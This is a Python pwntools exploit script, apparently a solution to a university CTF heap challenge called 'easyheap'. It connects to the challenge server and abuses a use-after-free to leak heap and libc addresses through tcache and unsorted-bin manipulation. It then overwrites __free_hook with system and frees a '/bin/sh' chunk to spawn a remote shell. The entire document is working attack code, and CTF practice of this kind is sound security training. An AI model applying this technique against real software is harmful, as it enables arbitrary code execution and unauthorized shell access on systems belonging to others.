from pwn import *

# context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

# io = gdb.debug("./easyheap_bin_new", "c")
io = remote("edu-ctf.zoolab.org", 30211)


def addbook(idx: int, name: bytes, nameln=None, price=8763):
    if nameln is None:
        nameln = len(name)
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"Length of name: ", str(nameln).encode())
    io.sendlineafter(b"Name: ", name)
    io.sendlineafter(b"Price: ", str(price).encode())


def delbook(idx: int):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Which book do you want to delete: ", str(idx).encode())


def editbook(idx: int, name: bytes, price=8763):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Which book do you want to edit: ", str(idx).encode())
    io.sendlineafter(b"Name: ", name)
    io.sendlineafter(b"Price: ", str(price).encode())


addbook(0, b"peko", 0x20)
addbook(1, b"peko", 0x430)
addbook(15, b"/bin/sh")  # prevent consolidate & set shell string
delbook(0)
delbook(1)

# tcache 0x30: book1 -> book0 -> name0
# unsorted bin: name1
# edit book1 name can control books[0]->name
# arbitrary read + write

# leak &tcache_perthread_struct
io.sendlineafter(b"> ", b"4")
io.recvuntil(b"Index:")
heap_addr = int(io.recvlineS().strip())
print(f"{heap_addr = :#x}")

# leak libc from unsorted bin
editbook(1, p64(heap_addr + 0x290 + 0x30 + 0x30 + 0x30))
io.sendlineafter(b"> ", b"5")
io.sendlineafter(b"Index: ", b"0")
io.recvuntil(b"Name: ")
libc_addr = int.from_bytes(io.recvn(6), "little") - 0x1EBBE0
print(f"{libc_addr = :#x}")

free_hook = libc_addr + 0x1EEB28
system = libc_addr + 0x55410

# write system to __free_hook
editbook(1, p64(free_hook))
editbook(0, p64(system))

# free(books[15]) -> system("/bin/sh")
delbook(15)

io.interactive()

# FLAG{to_easy...}
